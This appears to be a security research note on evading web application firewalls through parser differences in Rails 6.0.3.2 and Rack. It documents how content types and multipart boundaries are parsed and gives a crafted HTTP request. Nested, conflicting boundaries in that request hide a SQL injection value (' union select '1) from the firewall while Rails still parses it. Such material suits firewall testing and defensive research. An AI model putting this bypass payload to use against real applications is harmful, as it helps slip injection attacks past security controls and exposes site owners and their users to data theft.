### Rails 6.0.3.2

**Endpoint**
```ruby
def index
  data = request.POST
```

**Source code**  
[/rack/rack/lib/rack/multipart.rb](https://github.com/rack/rack/blob/ab41dccfe287b7d2589778308cb297eb039e88c6/lib/rack/multipart.rb#L15)
```ruby
MULTIPART = %r|\Amultipart/.*boundary=\"?([^\";,]+)\"?|ni
```

[/rails/rails/actionpack/lib/action_dispatch/http/mime_types.rb](https://github.com/rails/rails/blob/e82c10b49ad9cb949f77297e6a814fd8f09d3c8f/actionpack/lib/action_dispatch/http/mime_types.rb#L46)
```ruby
Mime::Type.register "application/json", :json, %w( text/x-json application/jsonrequest )
```

**Content-Type**  
```
application/x-www-form-urlencoded,XXX
multipart/form-data,XXX
```

**Multipart Content-Type**
| Check             | Value            |
|-------------------|------------------|
| Mime-Type         | case-insensitive |
| Multiple boundary | last position    |
| Boundary key      | case-insensitive |

**HTTP Request**
```http
POST / HTTP/1.1
Host: localhost
Content-Type: Multipart/FORM-data,XXX; boundary=wafboundary; xxxBOUNDARY=railsboundary,x=x
Content-Length: 225

--wafboundary
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

--railsboundary
Content-Disposition: form-data; name="q"

' union select '1
--railsboundary--
--wafboundary--
```

**JSON Content-Type**  
Strict parsing by default
```
application/json,XXX
text/x-json,XXX
application/jsonrequest,XXX
```

**HTTP Request**
```
POST / HTTP/1.1
Host: localhost
Content-Type: text/x-json
Content-Length: 13

{"test":true}
```